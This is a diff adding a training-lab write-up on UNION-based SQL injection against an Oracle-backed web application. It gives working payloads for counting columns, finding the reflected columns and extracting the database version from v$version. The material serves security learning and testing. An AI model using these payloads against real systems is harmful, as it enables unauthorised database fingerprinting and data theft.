@@ -1,0 +1,80 @@
+ Lab 1 -: SQL Injection Attack – Querying Database Type and Version (Oracle)
+1. Lab Information
+
+Lab Name: SQL Injection Attack, Querying the Database Type and Version on Oracle
+
+Severity: Medium
+
+Vulnerability Type: SQL Injection (UNION-Based SQL Injection)
+
+Database: Oracle
+
+2. Vulnerability Description
+
+The application is vulnerable to SQL Injection in the product category parameter. The user input is directly incorporated into a backend SQL query without proper sanitization.
+
+By exploiting the vulnerability using a UNION-based SQL Injection attack, an attacker can retrieve information from the underlying database, including the database version.
+
+3. Impact
+
+An attacker can:
+
+Extract database information.
+Fingerprint the database technology.
+Gather intelligence for further attacks.
+Potentially extract sensitive data from backend tables.
+4. Identifying the Number of Columns
+
+The application originally executes a query similar to:
+
+SELECT * FROM products
+WHERE category = 'Gifts'
+AND released = 1
+
+To determine the number of columns, the following payloads were tested:
+
+' ORDER BY 1--
+' ORDER BY 2--
+
+Both returned normal responses.
+
+Testing:
+
+' ORDER BY 3--
+
+Generated an error, indicating the query contains 2 columns.
+
+5. Identifying Displayed Columns
+
+A UNION query was used to determine which columns are reflected in the response.
+
+Payload:
+
+' UNION SELECT 'A','B' FROM dual--
+
+The values A and B appeared in the application response, confirming both columns are displayed.
+
+6. Extracting Oracle Database Version
+
+Oracle provides version information through the v$version table.
+
+Payload:
+
+' UNION SELECT banner,NULL FROM v$version--
+
+Alternative:
+
+' UNION SELECT NULL,banner FROM v$version--
+
+The application displayed the database version string.
+
+7. Proof of Concept
+Payload
+' UNION SELECT banner,NULL FROM v$version--
+Result
+
+The application returned:
+
+Oracle Database 19c Enterprise Edition Release 19.0.0.0.0
+
+The database version information was successfully disclosed.
